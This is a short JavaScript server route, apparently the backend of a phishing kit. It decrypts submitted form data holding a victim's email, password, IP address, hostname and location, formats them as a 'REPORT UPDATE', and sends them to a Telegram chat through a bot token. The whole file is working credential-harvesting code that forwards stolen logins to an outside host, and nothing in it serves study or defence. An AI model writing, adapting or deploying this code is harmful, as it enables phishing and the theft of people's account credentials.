import TelegramBot from 'node-telegram-bot-api';

import crypto from 'crypto';

const key = Buffer.from(process.env.NEXT_PUBLIC_ENCRYPTION_KEY, 'base64');

const {
  TELEGRAM_BOT_TOKEN,
  CHAT_ID
} = process.env

// Create a bot instance
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
//https://api.telegram.org/bot<YourBotToken>/getUpdates
export default async function handler (req , res) {

    try {

      if (!key) {
        throw new Error("ENCRYPTION_KEY is not set in environment variables");
      }

      const body = await req.body;
      const { vtext, ivv } = body;
      // Decode base64 into Uint8Array
      const encryptedArray = Uint8Array.from(atob(vtext), c => c.charCodeAt(0));
      const ivArray = Uint8Array.from(atob(ivv), c => c.charCodeAt(0));

      const tag = encryptedArray.slice(-16); // last 16 bytes = auth tag
      const data = encryptedArray.slice(0, -16);

      // Set up decipher with AES-256-GCM
      const decipher = crypto.createDecipheriv('aes-256-gcm', key, Buffer.from(ivArray));
      decipher.setAuthTag(Buffer.from(tag))

      const decrypted = Buffer.concat([
        decipher.update(Buffer.from(data)),
        decipher.final(),
      ]);

      const json = JSON.parse(decrypted.toString('utf8'));
      const {email, password, country, city, region, host_ip, hostname, postal_code, timezone, date} = json
      const user_agent = req.headers['user-agent']
      const message = `REPORT UPDATE \n ----------------------------------- \n \nEmail: ${email}\nPassword: ${password}\nCountry: ${country}\nCity: ${city}\nRegion: ${region}\nHost_Ip: ${host_ip}\nHostname: ${hostname}\nTime Zone: ${timezone}\nPostal Code: ${postal_code}\nDate: ${date}\nUser_agent: ${user_agent}`
      // let qs = `?start=1&limit=5000&convert=USD`

      console.log('Log: ', message);
      await bot.sendMessage(CHAT_ID, message);
      console.log('Message sent successfully!');

      res.status(200).json({data: true})
    } catch (err) {
      console.log(err);
      // reject(ex);
      res.status(400).json({message: `Error Fetching from api: ${err}`})

    }
  }